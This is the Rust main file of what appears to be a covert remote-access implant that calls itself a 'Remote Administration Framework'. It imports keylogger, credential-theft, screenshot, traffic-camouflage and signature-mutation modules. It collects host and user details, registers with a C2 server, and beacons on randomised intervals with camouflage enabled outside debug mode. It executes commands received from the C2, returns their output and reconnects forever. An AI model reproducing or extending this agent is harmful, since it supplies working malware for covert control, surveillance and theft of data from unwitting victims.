use log::{info, error, debug};
use std::time::Duration;
use tokio::time::sleep;

mod config;
mod communicator;
pub mod executor;
mod recon;
mod crypto;
mod mutation;
mod camouflage;
pub mod screenshot;
pub mod keylogger;
pub mod credentials;
#[allow(dead_code, unused_imports, unused_variables, unused_mut)]
mod network;
#[allow(dead_code, unused_imports, unused_variables, unused_mut)]
mod port_handler;

use config::Config;
use communicator::BeaconPayload;
use executor::{CommandType, Executor};
use recon::SystemInfo;
use crypto::CryptoManager;
use camouflage::CamouflageMode;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::Builder::from_default_env()
        .format_timestamp_millis()
        .init();

    info!("╔════════════════════════════════════════════════════════╗");
    info!("║  🦀 Secure Remote Agent v0.1.0                        ║");
    info!("║  Remote Administration Framework                       ║");
    info!("╚════════════════════════════════════════════════════════╝");

    // Load configuration
    let config = Config::from_env()?;
    info!("✅ Configuration loaded successfully");

    // Validate configuration
    config.validate()?;
    info!("✅ Configuration validated");

    // Initialize crypto manager
    let crypto = CryptoManager::new(&config.encryption_key)?;
    info!("✅ Encryption subsystem initialized (AES-256-GCM)");

    // Gather system information
    let sys_info = recon::gather_system_info()?;
    info!("✅ System information gathered");
    info!("   Hostname: {}", sys_info.hostname);
    info!("   OS: {} ({})", sys_info.os, sys_info.os_version);
    info!("   Architecture: {}", sys_info.architecture);
    info!("   Agent ID: {}", sys_info.agent_id);

    // Run main agent loop
    info!("🚀 Starting main agent loop...");
    match run_agent(&config, crypto, &sys_info).await {
        Ok(_) => {
            info!("Agent loop completed gracefully");
        }
        Err(e) => {
            error!("Fatal error in agent loop: {}", e);
            std::process::exit(1);
        }
    }

    Ok(())
}

async fn run_agent(
    config: &Config,
    crypto: CryptoManager,
    sys_info: &SystemInfo,
) -> Result<(), Box<dyn std::error::Error>> {
    // Derive a separate mutation seed from the encryption key
    let mutation_seed = {
        use hmac::{Hmac, Mac};
        use sha2::Sha256;
        type HmacSha256 = Hmac<Sha256>;
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&config.encryption_key)
            .expect("HMAC accepts any key size");
        mac.update(b"mutation-engine-seed");
        let result = mac.finalize().into_bytes();
        let mut seed = [0u8; 32];
        seed.copy_from_slice(&result);
        seed
    };

    let camouflage_mode = if config.debug {
        CamouflageMode::None
    } else {
        CamouflageMode::Full
    };

    let mut communicator = communicator::Communicator::new(
        &config.c2_url,
        config.c2_port,
        &sys_info.agent_id,
        config.beacon_interval,
        crypto,
        &mutation_seed,
        camouflage_mode,
    );
    info!("Traffic camouflage: {}", if config.debug { "disabled (debug)" } else { "full" });

    loop {
        // Attempt connection
        match communicator.connect().await {
            Ok(()) => {
                info!("🔗 Connected to C2 server");

                // Send plaintext registration with system info
                let username = std::env::var("USERNAME")
                    .or_else(|_| std::env::var("USER"))
                    .unwrap_or_else(|_| "unknown".to_string());
                let reg_msg = serde_json::json!({
                    "msg_type": "REGISTER",
                    "agent_id": sys_info.agent_id,
                    "hostname": sys_info.hostname,
                    "os": sys_info.os,
                    "os_version": sys_info.os_version,
                    "architecture": sys_info.architecture,
                    "user": username,
                });
                if let Err(e) = communicator.send_raw(&reg_msg.to_string()).await {
                    error!("Registration failed: {}", e);
                }

                // Main command loop
                'beacon: loop {
                    let beacon = BeaconPayload {
                        agent_id: sys_info.agent_id.clone(),
                        hostname: sys_info.hostname.clone(),
                        os: sys_info.os.clone(),
                        os_version: sys_info.os_version.clone(),
                        architecture: sys_info.architecture.clone(),
                        ip_address: None,
                        user: None,
                        privileges: None,
                    };

                    if let Err(e) = communicator.send_beacon(&beacon).await {
                        error!("Beacon send failed: {}", e);
                        break 'beacon;
                    }

                    let next_interval = communicator.next_beacon_interval().await;
                    info!("📡 Beacon sent (next in: {}s)", next_interval);

                    // Check for incoming commands
                    match communicator.receive_command().await {
                        Ok(Some(cmd_str)) => {
                            info!("📥 Command received: {}", cmd_str);

                            if let Ok(cmd) = serde_json::from_str::<CommandType>(&cmd_str) {
                                let result = Executor::execute_command(&cmd).await;
                                info!("✅ Command executed in {}ms", result.execution_time_ms);

                                let response = communicator::CommandResponse {
                                    command_id: 1,
                                    status: result.status.clone(),
                                    output: result.output.clone(),
                                    error: result.error.clone(),
                                    execution_time: result.execution_time_ms as u64,
                                };

                                if let Err(e) = communicator.send_command_result(&response).await {
                                    error!("Failed to send command result: {}", e);
                                    break 'beacon;
                                }
                            } else {
                                error!("Failed to parse command");
                            }
                        }
                        Ok(None) => {
                            debug!("No commands received");
                        }
                        Err(e) => {
                            error!("Connection lost: {}", e);
                            break 'beacon;
                        }
                    }

                    sleep(Duration::from_secs(next_interval)).await;
                }
            }
            Err(e) => {
                error!("Connection failed: {}", e);
            }
        }

        // Always reconnect after disconnection, with a short delay
        info!("🔄 Reconnecting in 5s...");
        sleep(Duration::from_secs(5)).await;
    }
}
